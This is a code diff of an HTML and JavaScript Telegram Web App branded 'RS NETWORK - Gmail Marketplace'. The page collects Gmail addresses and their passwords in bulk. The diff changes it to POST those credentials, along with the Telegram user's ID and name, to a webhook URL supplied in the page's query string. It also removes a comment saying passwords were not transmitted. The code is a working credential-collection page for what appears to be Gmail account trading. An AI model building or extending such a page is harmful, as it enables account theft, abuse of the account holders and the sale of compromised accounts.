@@ -1,7 +1,21 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
+
 <head>
+
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">  <title>RS NETWORK - Gmail Marketplace</title>  <script src="https://telegram.org/js/telegram-web-app.js"></script>  <style>
+
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+  >
+
+  <title>RS NETWORK - Gmail Marketplace</title>
+
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+  <style>
+
     * {
       box-sizing: border-box;
       margin: 0;
@@ -263,6 +277,7 @@
     }
 
     @media (max-width: 480px) {
+
       body {
         padding: 10px 6px 25px;
       }
@@ -286,95 +301,179 @@
       .excel-table {
         min-width: 530px;
       }
+
     }
-  </style></head><body><div class="container">  <div class="header">
-    <div class="logo">RS NETWORK</div>
-    <div class="subtitle">GMAIL MARKETPLACE</div>
-  </div>  <div class="card" id="mainCard"><div class="title">
-  📋 BULK GMAIL SUBMISSION
+
+  </style>
+
+</head>
+
+
+<body>
+
+
+<div class="container">
+
+
+  <div class="header">
+
+    <div class="logo">
+      RS NETWORK
+    </div>
+
+    <div class="subtitle">
+      GMAIL MARKETPLACE
+    </div>
+
+  </div>
+
+
+  <div class="card" id="mainCard">
+
+
+    <div class="title">
+      📋 BULK GMAIL SUBMISSION
+    </div>
+
+
+    <div class="description">
+      Add your Gmail and PASS / NOTE below. Add multiple entries and submit them together.
+    </div>
+
+
+    <div class="counter" id="counter">
+      📦 Total Entries: 0
+    </div>
+
+
+    <div class="table-wrapper">
+
+
+      <table class="excel-table">
+
+
+        <thead>
+
+          <tr>
+
+            <th style="width:48px;">
+              #
+            </th>
+
+            <th>
+              📧 GMAIL
+            </th>
+
+            <th>
+              🔑 PASS / NOTE
+            </th>
+
+            <th style="width:58px;">
+              ❌
+            </th>
+
+          </tr>
+
+        </thead>
+
+
+        <tbody id="rows"></tbody>
+
+
+      </table>
+
+
+    </div>
+
+
+    <div class="buttons">
+
+
+      <button
+        type="button"
+        class="add-btn"
+        id="addButton"
+        onclick="addRow()"
+      >
+        ➕ ADD MORE
+      </button>
+
+
+      <button
+        type="button"
+        class="submit-btn"
+        id="submitButton"
+        onclick="submitAll()"
+      >
+        📤 SUBMIT ALL
+      </button>
+
+
+    </div>
+
+
+    <div
+      id="message"
+      class="message"
+    ></div>
+
+
+    <div class="info">
+
+      📧 Gmail must be a valid @gmail.com address.<br>
+
+      🔑 PASS / NOTE accepts any text, number, space or symbol.
+
+    </div>
+
+
+  </div>
+
+
+  <div
+    class="card success-screen"
+    id="successScreen"
+  >
+
+
+    <div class="success-icon">
+      ✅
+    </div>
+
+
+    <div class="success-title">
+      SUBMISSION CONFIRMED
+    </div>
+
+
+    <div class="pending">
+      🟡 STATUS: PENDING
+    </div>
+
+
+    <div class="success-text">
+
+      Your submission has been successfully received.<br><br>
+
+      📦 <b id="successCount">0</b> entries submitted.<br>
+
+      ⏳ Your submission is currently under review.<br><br>
+
+      🕐 <b>Report will be available within 24 hours.</b><br><br>
+
+      Telegram will open automatically in 3 seconds.
+
+    </div>
+
+
+  </div>
+
+
 </div>
 
-<div class="description">
-  Add your Gmail and PASS / NOTE below. Add multiple entries and submit them together.
-</div>
 
-<div class="counter" id="counter">
-  📦 Total Entries: 0
-</div>
+<script>
 
-<div class="table-wrapper">
-
-  <table class="excel-table">
-
-    <thead>
-      <tr>
-        <th style="width:48px;">#</th>
-        <th>📧 GMAIL</th>
-        <th>🔑 PASS / NOTE</th>
-        <th style="width:58px;">❌</th>
-      </tr>
-    </thead>
-
-    <tbody id="rows"></tbody>
-
-  </table>
-
-</div>
-
-<div class="buttons">
-
-  <button
-    type="button"
-    class="add-btn"
-    id="addButton"
-    onclick="addRow()">
-    ➕ ADD MORE
-  </button>
-
-  <button
-    type="button"
-    class="submit-btn"
-    id="submitButton"
-    onclick="submitAll()">
-    📤 SUBMIT ALL
-  </button>
-
-</div>
-
-<div id="message" class="message"></div>
-
-<div class="info">
-  📧 Gmail must be a valid @gmail.com address.<br>
-  🔑 PASS / NOTE accepts any text, number, space or symbol.
-</div>
-
-  </div>  <div class="card success-screen" id="successScreen"><div class="success-icon">
-  ✅
-</div>
-
-<div class="success-title">
-  SUBMISSION CONFIRMED
-</div>
-
-<div class="pending">
-  🟡 STATUS: PENDING
-</div>
-
-<div class="success-text">
-
-  Your submission has been successfully received.<br><br>
-
-  📦 <b id="successCount">0</b> entries submitted.<br>
-
-  ⏳ Your submission is currently under review.<br><br>
-
-  🕐 <b>Report will be available within 24 hours.</b><br><br>
-
-  Telegram will open automatically in 3 seconds.
-
-</div>
-
-  </div></div><script>
 
 /* ==========================================
    TELEGRAM
@@ -397,6 +496,20 @@ if (tg) {
 
 
 /* ==========================================
+   WEBHOOK URL
+========================================== */
+
+const urlParams =
+  new URLSearchParams(
+    window.location.search
+  );
+
+
+const webhookUrl =
+  urlParams.get("webhook");
+
+
+/* ==========================================
    VARIABLES
 ========================================== */
 
@@ -409,11 +522,14 @@ let submitted = false;
    START
 ========================================== */
 
-window.addEventListener("load", function () {
+window.addEventListener(
+  "load",
+  function () {
 
-  addRow();
+    addRow();
 
-});
+  }
+);
 
 
 /* ==========================================
@@ -424,16 +540,25 @@ function addRow() {
 
   if (submitted) return;
 
+
   const tbody =
-    document.getElementById("rows");
+    document.getElementById(
+      "rows"
+    );
+
 
   rowCount++;
 
+
   const tr =
-    document.createElement("tr");
+    document.createElement(
+      "tr"
+    );
+
 
   tr.className =
     "data-row";
+
 
   tr.innerHTML = `
 
@@ -470,7 +595,8 @@ function addRow() {
       <button
         type="button"
         class="remove-btn"
-        onclick="removeRow(this)">
+        onclick="removeRow(this)"
+      >
         ×
       </button>
 
@@ -478,7 +604,9 @@ function addRow() {
 
   `;
 
+
   tbody.appendChild(tr);
+
 
   updateNumbers();
 
@@ -495,28 +623,34 @@ function removeRow(button) {
 
   if (submitted) return;
 
+
   const rows =
-    document.querySelectorAll(".data-row");
+    document.querySelectorAll(
+      ".data-row"
+    );
+
 
   if (rows.length <= 1) {
 
     showMessage(
-      "❌ At least one entry is required.",
-      "error"
+      "❌ At least one entry is required."
     );
 
     return;
 
   }
 
+
   const row =
     button.closest("tr");
+
 
   if (row) {
 
     row.remove();
 
   }
+
 
   updateNumbers();
 
@@ -532,16 +666,21 @@ function removeRow(button) {
 function updateNumbers() {
 
   const rows =
-    document.querySelectorAll(".data-row");
+    document.querySelectorAll(
+      ".data-row"
+    );
 
-  rows.forEach(function(row, index) {
 
-    row.querySelector(
-      ".number-cell"
-    ).textContent =
-      index + 1;
+  rows.forEach(
+    function(row, index) {
 
-  });
+      row.querySelector(
+        ".number-cell"
+      ).textContent =
+        index + 1;
+
+    }
+  );
 
 }
 
@@ -553,12 +692,16 @@ function updateNumbers() {
 function updateCounter() {
 
   const total =
-    document.querySelectorAll(".data-row").length;
+    document.querySelectorAll(
+      ".data-row"
+    ).length;
+
 
   document.getElementById(
     "counter"
   ).textContent =
-    "📦 Total Entries: " + total;
+    "📦 Total Entries: " +
+    total;
 
 }
 
@@ -569,7 +712,9 @@ function updateCounter() {
 
 function isValidGmail(email) {
 
-  return /^[a-zA-Z0-9._%+-]+@gmail\.com$/i.test(email);
+  return /^[a-zA-Z0-9._%+-]+@gmail\.com$/i.test(
+    email
+  );
 
 }
 
@@ -581,17 +726,25 @@ function isValidGmail(email) {
 function showMessage(text) {
 
   const message =
-    document.getElementById("message");
+    document.getElementById(
+      "message"
+    );
+
 
   message.className =
     "message error-message";
 
+
   message.innerHTML =
     text;
 
+
   message.scrollIntoView({
+
     behavior: "smooth",
+
     block: "center"
+
   });
 
 }
@@ -601,34 +754,19 @@ function showMessage(text) {
    SUBMIT
 ========================================== */
 
-function submitAll() {
+async function submitAll() {
 
   if (submitted) return;
 
 
-  /*
-   * Telegram WebApp must exist because
-   * Telegram is the only transport used
-   * by this version.
-   */
+  /* ========================================
+     WEBHOOK CHECK
+  ======================================== */
 
-  if (!tg) {
+  if (!webhookUrl) {
 
     showMessage(
-      "❌ Telegram Web App পাওয়া যায়নি। অনুগ্রহ করে Telegram Bot-এর SUBMIT NEW GMAIL বাটন দিয়ে এই পেজটি খুলুন।"
-    );
-
-    return;
-
-  }
-
-
-  if (
-    typeof tg.sendData !== "function"
-  ) {
-
-    showMessage(
-      "❌ Telegram Web App sendData unavailable. Telegram app থেকে আবার খুলুন।"
+      "❌ Webhook URL পাওয়া যায়নি। অনুগ্রহ করে Telegram-এর SUBMIT NEW GMAIL বাটন দিয়ে Web App খুলুন।"
     );
 
     return;
@@ -637,13 +775,17 @@ function submitAll() {
 
 
   const rows =
-    document.querySelectorAll(".data-row");
+    document.querySelectorAll(
+      ".data-row"
+    );
 
 
   const submissions = [];
 
+
   const usedEmails =
     new Set();
+
 
   let hasError = false;
 
@@ -652,106 +794,114 @@ function submitAll() {
      VALIDATE
   ======================================== */
 
-  rows.forEach(function(row) {
-
-    const gmailInput =
-      row.querySelector(
-        ".gmail-input"
-      );
-
-    const passInput =
-      row.querySelector(
-        ".pass-input"
-      );
+  rows.forEach(
+    function(row) {
 
 
-    const gmail =
-      gmailInput.value
-        .trim()
-        .toLowerCase();
+      const gmailInput =
+        row.querySelector(
+          ".gmail-input"
+        );
 
 
-    const pass =
-      passInput.value.trim();
+      const passInput =
+        row.querySelector(
+          ".pass-input"
+        );
 
 
-    gmailInput.classList.remove(
-      "error"
-    );
-
-    passInput.classList.remove(
-      "error"
-    );
+      const gmail =
+        gmailInput.value
+          .trim()
+          .toLowerCase();
 
 
-    if (!gmail) {
+      /*
+       * PASS / NOTE:
+       * Do NOT remove spaces.
+       * Any text/number/symbol is allowed.
+       */
 
-      gmailInput.classList.add(
+      const pass =
+        passInput.value;
+
+
+      gmailInput.classList.remove(
         "error"
       );
 
-      hasError = true;
 
-      return;
-
-    }
-
-
-    if (!isValidGmail(gmail)) {
-
-      gmailInput.classList.add(
+      passInput.classList.remove(
         "error"
       );
 
-      hasError = true;
 
-      return;
+      if (!gmail) {
+
+        gmailInput.classList.add(
+          "error"
+        );
+
+        hasError = true;
+
+        return;
+
+      }
+
+
+      if (!isValidGmail(gmail)) {
+
+        gmailInput.classList.add(
+          "error"
+        );
+
+        hasError = true;
+
+        return;
+
+      }
+
+
+      if (!pass.trim()) {
+
+        passInput.classList.add(
+          "error"
+        );
+
+        hasError = true;
+
+        return;
+
+      }
+
+
+      if (usedEmails.has(gmail)) {
+
+        gmailInput.classList.add(
+          "error"
+        );
+
+        hasError = true;
+
+        return;
+
+      }
+
+
+      usedEmails.add(gmail);
+
+
+      submissions.push({
+
+        gmail: gmail,
+
+        pass: pass
+
+      });
+
 
     }
-
-
-    if (!pass) {
-
-      passInput.classList.add(
-        "error"
-      );
-
-      hasError = true;
-
-      return;
-
-    }
-
-
-    if (usedEmails.has(gmail)) {
-
-      gmailInput.classList.add(
-        "error"
-      );
-
-      hasError = true;
-
-      return;
-
-    }
-
-
-    usedEmails.add(gmail);
-
-
-    /*
-     * PASS / NOTE is deliberately
-     * NOT transmitted.
-     */
-
-    submissions.push({
-
-  gmail: gmail,
-  pass: pass
-
-});
-
-  });
+  );
 
 
   /* ========================================
@@ -781,10 +931,11 @@ function submitAll() {
 
 
   /* ========================================
-     PAYLOAD
+     TELEGRAM USER
   ======================================== */
 
   const telegramUser =
+    tg &&
     tg.initDataUnsafe &&
     tg.initDataUnsafe.user
       ? tg.initDataUnsafe.user
@@ -809,6 +960,14 @@ function submitAll() {
           )
         : "",
 
+    user_name:
+      telegramUser
+        ? (
+            telegramUser.first_name ||
+            "Unknown"
+          )
+        : "Unknown",
+
     entries:
       submissions
 
@@ -823,21 +982,42 @@ function submitAll() {
     "submitButton"
   ).disabled = true;
 
+
   document.getElementById(
     "addButton"
   ).disabled = true;
 
 
   /* ========================================
-     SEND
+     SEND TO BOTS.BUSINESS WEBHOOK
   ======================================== */
 
   try {
 
-    tg.sendData(
-      JSON.stringify(
-        payload
-      )
+
+    await fetch(
+      webhookUrl,
+
+      {
+
+        method: "POST",
+
+        mode: "no-cors",
+
+        headers: {
+
+          "Content-Type":
+            "text/plain;charset=UTF-8"
+
+        },
+
+        body:
+          JSON.stringify(
+            payload
+          )
+
+      }
+
     );
 
 
@@ -870,22 +1050,30 @@ function submitAll() {
        CLOSE
     ====================================== */
 
-    setTimeout(function() {
+    setTimeout(
+      function() {
 
-      try {
+        try {
 
-        tg.close();
+          if (tg) {
 
-      } catch (e) {
+            tg.close();
 
-        console.log(e);
+          }
 
-      }
+        } catch (e) {
 
-    }, 3000);
+          console.log(e);
+
+        }
+
+      },
+      3000
+    );
 
 
   } catch (error) {
+
 
     console.error(
       error
@@ -895,6 +1083,7 @@ function submitAll() {
     document.getElementById(
       "submitButton"
     ).disabled = false;
+
 
     document.getElementById(
       "addButton"
@@ -909,5 +1098,9 @@ function submitAll() {
 
 }
 
-</script></body>
-  </html>
+</script>
+
+
+</body>
+
+</html>
